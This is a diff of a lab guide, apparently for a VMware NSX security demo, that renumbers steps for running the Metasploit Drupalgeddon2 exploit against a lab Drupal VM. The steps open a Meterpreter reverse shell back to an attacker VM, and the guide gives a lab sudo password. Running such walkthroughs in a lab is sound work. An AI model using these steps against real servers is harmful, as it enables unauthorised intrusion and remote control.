@@ -442,20 +442,20 @@ msf5 auxiliary(scanner/portscan/tcp) > run
 > **Note**: To reduce the number of OVAs needed, each workload VM deployed runs both a vulnerable **Drupal** and a vulnerable **CouchDB** service
 
 **Initiate DrupalGeddon2 attack against App1-WEB-TIER VM**
-3. In order to launch the **Drupalgeddon2** exploit against the **App1-WEB-TIER VM**, you can either manually configure the **Metasploit** module, or edit and run a pre-defined script. 
+1. In order to launch the **Drupalgeddon2** exploit against the **App1-WEB-TIER VM**, you can either manually configure the **Metasploit** module, or edit and run a pre-defined script. 
     * If you want to run the attack manually, skip to step #5. 
     * If you want to go with the script option, run **sudo nano attack1.rc** and type **VMware1!** when asked for the password. 
     * Confirm that the **RHOST** line IP address matches with the IP address of **App1-WEB-TIER VM** you saw in the NSX VM Inventory. 
     * Change this IP address if needed. 
     * Save your changes and exit **nano**
-4. Type **sudo ./attack1.sh** to initiate the Metasploit script and Drupalgeddon exploit. Next, go to step #6
-5.  **Alternatively**, to run the attack manually, type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
+2. Type **sudo ./attack1.sh** to initiate the Metasploit script and Drupalgeddon exploit. Next, go to step #6
+3.  **Alternatively**, to run the attack manually, type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
     * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
     * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
     * Type **exploit** to initiate the exploit attempt
     
-6. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
+4. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
 
 ```console
 vmware@ubuntu:~$ ./attack1.sh
@@ -491,7 +491,7 @@ resource (attack1.rc)> exploit
 
 ```
 
-7. **Optionally**, you can now intract with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
+4. **Optionally**, you can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
     * Type **sysinfo** to learn more about the running OS
 
 ```console
